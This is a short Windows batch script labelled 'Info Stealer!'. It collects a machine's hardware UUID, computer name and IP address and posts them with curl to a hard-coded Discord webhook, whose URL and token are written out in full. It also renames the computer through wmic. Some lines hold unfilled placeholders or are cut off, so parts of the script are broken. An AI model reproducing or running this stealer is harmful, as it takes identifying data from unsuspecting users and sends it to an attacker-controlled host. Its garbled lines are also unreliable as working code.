@echo off
color F0
echo Info Stealer!

::SET WEBHOOK HERE!
set webhook=https://discord.com/api/webhooks/1032144603203256361/k4euXf57xGzrA_XyfJw6ItprfV-e1D0dbx16GISowYNgK9mcxdDkRlla38hWMe0HFrkj

for /f "tokens=2 delims==" %%J in ('wmic csproduct get uuid /value') do set serial=%%J
Find /I "%serial%" {Location of file} > {Location of confirmation file}
For /f "tokens=1,2* delims=," %%G in ({Location of confirmation file}) do set HN=%%H
wmic computersystem where caption='%computername%' rename %HN%` 
del {Location
for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set ip=%%a
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"Opened on: `%date%` at `%time%`\nPC NAME: `%computername%`\nIP Address: `%ip%`\nHWID: `%serial%`\n\"}" %webhook%
pause
